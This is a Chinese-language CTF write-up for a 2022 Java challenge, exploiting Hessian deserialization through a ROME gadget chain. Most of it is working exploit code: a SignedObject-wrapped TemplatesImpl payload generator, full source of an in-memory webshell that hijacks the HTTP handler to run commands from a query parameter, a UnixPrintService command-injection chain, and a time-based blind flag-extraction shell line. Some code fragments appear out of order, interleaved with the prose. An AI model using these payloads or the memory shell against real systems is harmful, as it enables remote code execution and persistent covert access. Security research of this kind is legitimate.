@Y4tacker
2022虎符CTF-Java部分
写在前⾯
⾮⼩⽩⽂，代码基于marshalsec项⽬基础上进⾏修改
正⽂
本⾝我是不太懂hessian的反序列化，⼤概去⽹上搜了⼀下配合ROME利⽤的思路（如果反序
列化map对象，在逻辑后⾯通过put操作，从⽽触发对key调⽤hashCode打ROME），这⾥不清
楚可以看看ROME利⽤链以及hessian反序列化的⼀些简单东西
⾸先简单看下docker，可以看到会导致不能出⽹
version: '2.4'
services:
  nginx:
    image: nginx:1.15
    ports:
      - "0.0.0.0:8090:80"
    restart: always
    volumes:
        - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
    networks:
      - internal_network
      - out_network
  web:
    build: ./
    restart: always
    volumes:
nginx.conf
        - ./flag:/flag:ro
    networks:
      - internal_network
networks:
    internal_network:
        internal: true
        ipam:
            driver: default
    out_network:
        ipam:
            driver: default
server {
    listen       80;
    server_name  localhost;
    location / {
        root   /usr/share/nginx/html;
        index  index.html index.htm;
    proxy_pass http://web:8090;
    }
    #error_page  404              /404.html;
    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }
}
利⽤⼀：SignedObject实现⼆次反序列化
既然不出⽹那就⽆法配合JNDI去利⽤了（⽹上主流的利⽤），后⾯尝试了TemplatesImpl，在
Hessian的⼀些限制下(有空⾃⼰去看源码)，导致被 transient 修饰的 _tfactory 对象⽆法
写⼊造成空指针异常，为什么呢,⾃⼰看图可以看到不仅仅是被 transient 修饰，同时静态变
量也不⾏，这⾥导致另⼀个利⽤链不能打，这⾥不提
之后解决思路就是找个⼆次反序列化的点触发原⽣反序列化即可，最后找到
个 java.security.SignedObject#SignedObject ,⾥⾯的getObject可以触发
    public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
这时候聪明的你⼀定想问，为什么原⽣反序列化就可以恢复这个 trasient 修饰的变量呢，
答案如
下 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject ,
重写了readOBject⽅法
因此得到下⾯简单的payload，下⾯payload有⼀些地⽅还可以完善变得更好，但是我懒
package marshalsec;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import 
com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import marshalsec.gadgets.JDKUtil;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;
import static marshalsec.util.Reflections.setFieldValue;
public class Test {
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get("Yyds").toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_class",null);
         setFieldValue(templates,"_tfactory",new 
TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        ToStringBean bean = new ToStringBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException = new 
BadAttributeValueExpException(1);
        setFieldValue(badAttributeValueExpException,"val",bean);
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject so = null;
        so = new SignedObject(badAttributeValueExpException, privateKey, 
signingEngine);
这样就可以实现执⾏反序列化打 TemplatesImpl 加载恶意代码了，接下来既然不出⽹，⽐较
⽅便的就是去注⼊内存马
按照经验来讲Web中间件是多线程的应⽤，⼀般requst对象都会存储在线程对象中，可以通过
Thread.currentThread() 或 Thread.getThreads() 获取，按照这个思路写就⾏了
        ObjectBean delegate = new ObjectBean(SignedObject.class, so);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        HashMap map = JDKUtil.makeMap(root, root);
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(os);
        output.writeObject(map);
        output.getBytesOutputStream().flush();
        output.completeMessage();
        output.close();
        System.out.println(new 
String(Base64.getEncoder().encode(os.toByteArray())));
    }
}
我是懒狗之间暴⼒替换handler(继承AbstractTranslet实现HttpHandler)，嫌弃⿇烦可以⾃⼰加路
由可以让代码更短，还可以放到静态块防⽌触发两次，⼀句话我懒⾃⼰改去
import com.sun.net.httpserver.HttpContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.*;
import java.lang.reflect.Field;
public class Yyds extends AbstractTranslet implements HttpHandler {
    public void handle(HttpExchange t) throws IOException {
        String response = "Y4tacker's MemoryShell";
        String query = t.getRequestURI().getQuery();
        String[] var3 = query.split("=");
        System.out.println(var3[0]+var3[1]);
        ByteArrayOutputStream output = null;
        if (var3[0].equals("y4tacker")){
            InputStream inputStream = 
Runtime.getRuntime().exec(var3[1]).getInputStream();
            output = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = inputStream.read(buffer))) {
                output.write(buffer, 0, n);
            }
        }
        response+=("\n"+new String(output.toByteArray()));
        t.sendResponseHeaders(200, (long)response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
    public void transform(DOM document, SerializationHandler[] handlers) 
throws TransletException {
    }
    public void transform(DOM document, DTMAxisIterator iterator, 
SerializationHandler handler) throws TransletException {
    }
    public Yyds() throws Exception  {
        super();
        try{
            Object obj = Thread.currentThread();
            Field field = obj.getClass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
            Thread[] threads = (Thread[]) obj;
            for (Thread thread : threads) {
                if (thread.getName().contains("Thread-2")) {
                    try {
                        field = 
thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);
                        System.out.println(obj);
                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);
                        obj = field.get(obj);
其实可以去静态块改⼀下，不然执⾏两次多多少少有点烦，就这样了so easy
当然太暴⼒了也不好哈哈哈，还可以在上⾯的
sun.net.httpserver.ServerImpl$Dispatcher 直接执
⾏ sun.net.httpserver.ServerImpl#createContext(java.lang.String, 
com.sun.net.httpserver.HttpHandler) 创建新的路由即可
这⾥就不写了，⼀个字懒，反正也不难
                        field = 
obj.getClass().getDeclaredField("contexts");
                        field.setAccessible(true);
                        obj = field.get(obj);
                        field = obj.getClass().getDeclaredField("list");
                        field.setAccessible(true);
                        obj = field.get(obj);
                        java.util.LinkedList lt = 
(java.util.LinkedList)obj;
                        Object o = lt.get(0);
                        field = o.getClass().getDeclaredField("handler");
                        field.setAccessible(true);
                        field.set(o,this);
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }catch (Exception e){
        }
    }
}
实现效果  
利⽤⼆：UnixPrintService直接执⾏命令
之前不清楚，后⾯@wuyx师傅提醒我才发现可以不⽤实现序列化接⼜，具体可以参考
marshalsec的实现
在 sun.print.UnixPrintService 的所有get⽅法都能触发，别看这个是Unix其实linux也
有，在⾼版本被移除(有兴趣⾃⼰考古)，利⽤⽅式就是简单命令拼接执⾏（缺点就是太能弹
了，基本上每个get⽅法都能弹）
HessianBase.NoWriteReplaceSerializerFactory sf = new 
HessianBase.NoWriteReplaceSerializerFactory();
sf.setAllowNonSerializable(true);
output.setSerializerFactory(sf);
Constructor declaredConstructor = 
UnixPrintService.class.getDeclaredConstructor(String.class);
declaredConstructor.setAccessible(true);
ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,
declaredConstructor.newInstance(";open -na Calculator"));
ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
HashMap map = JDKUtil.makeMap(root, root);
//
ByteArrayOutputStream os = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(os);
HessianBase.NoWriteReplaceSerializerFactory sf = new 
HessianBase.NoWriteReplaceSerializerFactory();
sf.setAllowNonSerializable(true);
output.setSerializerFactory(sf);
output.writeObject(map);
output.getBytesOutputStream().flush();
output.completeMessage();
拿flag的话就两种⽅式 JavaAgent 注⼊内存马，或者本来就是ctf
如何快速拿利⽤链
在这次⽐赛后我简单学习了下⽤tabby，通过下⾯的neo4j查询语句，之后⼈⼯排查下
利⽤⼀：
利⽤⼆：
output.close();
System.out.println(new 
String(Base64.getEncoder().encode(os.toByteArray())));
if [ `cut -c 1 flag` = "a" ];then sleep 2;fi
match path=(m1:Method)-[:CALL*..3]->(m2:Method {}) where m1.NAME =~ 
"get.*" and m1.PARAMETER_SIZE=0 and (m2.NAME =~ "exec.*" or m2.NAME =~ 
"readObject") return path
总的来说还是学的挺多，挺有收获的⼀个⽐赛